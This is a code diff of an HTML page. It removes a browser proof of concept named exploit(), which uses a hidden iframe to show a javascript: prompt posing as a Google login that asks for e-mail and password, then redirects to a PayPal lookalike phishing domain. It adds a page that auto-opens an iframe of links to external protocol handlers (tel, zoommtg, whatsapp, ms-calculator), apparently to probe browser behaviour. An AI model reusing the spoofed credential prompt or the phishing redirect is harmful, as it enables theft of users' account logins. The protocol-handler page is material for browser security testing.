@@ -1,26 +1,33 @@
+<!DOCTYPE html>
 <html>
-  <body>
+<head>
+</head>
+<body>
+  <h1>Opening and Closing Popup Windows</h1>
 
-    <script>
-
-    function exploit() {
-
-      window.open("https://www.google.com");
-
-      document.getElementById("iframe").src = 'javascript:prompt("In order to access Google.com\\nyou must first login on your\\nGoogle Account.\\n\\nPlease type your e-mail\\nand your password:\\n", "E-mail / Password");';
-      document.location="http://www.manage-myaccount.paypal.com-webapps.bntk.pl";
-
+  <script>
+    // Script.js
+    function openURL() {
+      var iframe = document.createElement('iframe');
+      iframe.src = 'tel://a';
+      document.body.appendChild(iframe);
     }
-    
-    </script>
 
-    <br><br><br><br>
+    // Main.js
+    function openNewTab() {
+      var newTab = window.open("", "_self");
+      newTab.document.write('<h1>Popup Window</h1>');
+      newTab.document.write('<iframe></iframe>');
+      newTab.document.close();
 
-    <a href="#" onclick="exploit();">
-      <center><h1>Click here to go to Google.com</h1></center>
-    </a>
+      var iframeBody = newTab.document.querySelector('iframe').contentWindow.document.body;
+      iframeBody.innerHTML = '<p>Click <a href="tel://newwindow" onclick="openURL()">here</a> for open.</p><br><p>Click <a href="zoommtg://link" onclick="openURL()">here</a> for open.</p><br><p>Click <a href="whatsapp:11111" onclick="openURL()">here</a> for open.</p><br><p>Click <a href="ms-calculator::hello" onclick="openURL()">here</a> for open.</p><br>';
+    }
 
-    <iframe styleframeborder="0" style="width:0;height:0;" id="iframe" src=""></iframe>
-
-  </body>
+    // Panggil fungsi saat dokumen selesai dimuat
+    document.addEventListener('DOMContentLoaded', function() {
+      openNewTab();
+    });
+  </script>
+</body>
 </html>
